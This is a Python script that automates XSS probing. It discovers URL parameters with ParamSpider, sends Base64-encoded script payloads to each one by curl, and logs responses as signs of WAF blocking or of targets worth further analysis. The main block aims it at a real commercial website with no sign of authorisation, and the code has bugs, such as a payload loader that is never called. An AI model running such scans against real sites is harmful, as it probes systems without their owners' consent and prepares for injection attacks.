import os
import subprocess
import re  # Import the regular expression module
import time 
import sys
import base64

# Directory of the current script
script_dir = os.path.dirname(os.path.abspath(__file__))
payload_orgin = "<script>alert('XSS')</script>"  # Define the payload (the XSS script in this case)
def payloads_maker():
    global payload_orgin
    file_path = os.path.join(script_dir,"..","..","payload","xss_payload.txt")
    with open (file_path,"r",encoding="utf-8") as file:
        for payload_orgin in file:
            pass

# Function to create the Base64 encoded payload
def encode_maker(input_payload, change=True):
    """
    Encodes the input payload into Base64 format and stores it as a global variable.
    :param input_payload: The payload to be encoded (string).
    :param change: Whether to change the global payload variable.
    :return: The Base64 encoded payload.
    """
    if change:
        global payload  # Declare payload as a global variable
        payload = base64.b64encode(input_payload.encode('utf-8'))  # Base64 encoding
        return payload

# Function to test the web encoding (sending encoded payload)
def test_web_encode(url):
    """
    Sends the encoded payload to the target URL and tests if the server decodes it.
    :param url: Target URL to test (e.g., 'https://example.com/endpoint')
    """
    global payload
    if isinstance(payload, bytes):
        payload = payload.decode('utf-8')  # Decode bytes to string if it's in bytes
    else:
        pass  # If it's already a string, continue using it

    # Construct the curl command to send the payload to the target server
    command = [
        "curl", "-L", url,
        "-d", f"{payload}",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "User-Agent: Mozilla/5.0",
        "-v"
    ]
    # Run the curl command
    result = subprocess.run(command, text=True, capture_output=True)

    # Check if the payload was processed
    if payload in result.stdout or payload in result.stderr:
        print(f"Payload has been processed")
    else:
        print(f"Payload has not been processed")

    # Check for WAF (Web Application Firewall) or firewall error messages
    if "WAF" in result.stdout or "Access Denied" in result.stdout:
        print("WAF or firewall error detected")
        file_path = os.path.join(script_dir, "..", "..", "reporting", f"xss_scan_{test_url.replace('https://', '').replace('http://', '').replace('/', '_').replace(':', '_')}.txt")
        with open(file_path, "a", encoding="utf-8") as file:
            file.write(url + " WAF or firewall error detected\n")
    else:
        print("No WAF error detected")

# Function to check the HTTP response headers for specific status codes
def check_header(url, payload):
    command = [
        "curl", "-L", "-i", url,  # Use -L to follow redirects
        "-d", f"{payload}",  # Send the payload
        "-H", "Content-Type: application/x-www-form-urlencoded",  # Set Content-Type
        "-H", "User-Agent: Mozilla/5.0",
        "-v"  # Add User-Agent header
    ]
    result = subprocess.run(command, text=True, capture_output=True)

    # Use regex to extract the status code from the response
    status_code_match = re.search(r"HTTP\/\S+\s(\d{3})", result.stdout)
    if status_code_match:
        status_code = status_code_match.group(1)
    else:
        print("Unable to extract status code from response")
        return

    # Log the status code and possible firewall issues
    file_path = os.path.join(script_dir, "..", "..", "reporting", f"xss_scan_{test_url.replace('https://', '').replace('http://', '').replace('/', '_').replace(':', '_')}.txt")
    with open(file_path, "a", encoding="utf-8") as file:
        print(f"Returned status code: {status_code}")
        
        # Check for various status codes indicating firewall issues
        if status_code == "403":
            print(f"{url} may have been blocked by WAF firewall")
            file.write(f"{url} may have been blocked by WAF firewall\n")
        elif status_code == "400":
            print(f"{url} may have been wrongly identified as an attack by the firewall")
            file.write(f"{url} may have been wrongly identified as an attack by the firewall\n")
        elif status_code == "404":
            print(f"{url} page not found, might be blocked by firewall")
            file.write(f"{url} page not found, might be blocked by firewall\n")
        elif status_code == "301" or status_code == "302":
            # Redirect status code, indicating potential WAF block
            print(f"{url} was redirected, possibly blocked by WAF/firewall ({status_code})")
            file.write(f"{url} was redirected, possibly blocked by WAF/firewall ({status_code})\n")
        elif status_code == "500":
            print(f"{url} server error during processing (500)")
            file.write(f"{url} server error during processing (500)\n")
        elif status_code == "502":
            print(f"{url} bad gateway (502), possible network disruption or firewall issue")
            file.write(f"{url} bad gateway (502), possible network disruption or firewall issue\n")
        elif status_code == "503":
            print(f"{url} service unavailable (503), temporary issue with server")
            file.write(f"{url} service unavailable (503), temporary issue with server\n")
        elif status_code == "504":
            print(f"{url} gateway timeout (504), request timed out")
            file.write(f"{url} gateway timeout (504), request timed out\n")
        elif status_code == "401":
            print(f"{url} unauthorized (401), may require authentication")
            file.write(f"{url} unauthorized (401), may require authentication\n")
        elif status_code == "405":
            print(f"{url} method not allowed (405), check HTTP method restrictions")
            file.write(f"{url} method not allowed (405), check HTTP method restrictions\n")
        elif status_code == "408":
            print(f"{url} request timeout (408), potentially due to firewall delay")
            file.write(f"{url} request timeout (408), potentially due to firewall delay\n")
        
        # If status code is 200, mark as worthy of further analysis
        if status_code == "200":
            success_file_path = os.path.join(script_dir, "..", "..", "reporting", f"xss_scan_{url.replace('https://', '').replace('http://', '').replace('/', '_').replace(':', '_')}success.txt")
            with open(success_file_path, "a", encoding="utf-8") as file:
                print(f"{url} is worthy of further analysis")
                file.write(f"{url} is worthy of further analysis\n")

# Function to check parameters using ParamSpider (a tool for parameter discovery)
def paramspide_check(url):
    # Build the file path where ParamSpider will save the results
    file_path = os.path.join(script_dir, "..", "..", "tools", "ParamSpider", "paramspider", "results", f"{url.replace('https://', '').replace('/', '')}_.txt")
    print(f"File path: {file_path}")

    # Check if the target file exists
    if not os.path.exists(file_path):
        print(f"File not found, running ParamSpider to crawl {url}")
        python_interpreter_path = sys.executable
        run_path = os.path.join(script_dir, "..", "..", "tools", "ParamSpider", "paramspider", "main.py")
        # Run ParamSpider to discover parameters
        command = [
            python_interpreter_path, run_path, "-d", url
        ]
        result = subprocess.run(command, text=True, capture_output=True)
        if result.returncode == 0:
            print(f"ParamSpider completed successfully, results saved at: {file_path}")
        else:
            print("ParamSpider failed, please check the error messages")
            print(result.stderr)
    else:
        print(f"File already exists, no need to rerun ParamSpider")

# Function to keep scanning a URL using the discovered parameters
def keep_scan(url, wait=1):
    file_path = os.path.join(script_dir, "..", "..", "tools", "ParamSpider", "paramspider", "results", f"{url.replace('https://', '').replace('/', '')}_.txt")
    with open(file_path, encoding="utf-8") as file:
        for line in file:
            line = line.replace("FUZZ", "")  # Replace FUZZ placeholders
            print(f"Visiting {url}{payload}")
            test_web_encode(line.strip())
            check_header(line.strip(), payload)
            time.sleep(wait)

# Main function to test everything
if __name__ == "__main__":
    test_url = "https://www.starbucks.com/"
    encode_maker(payload_orgin, change=True)
    paramspide_check(test_url)
    keep_scan(test_url)
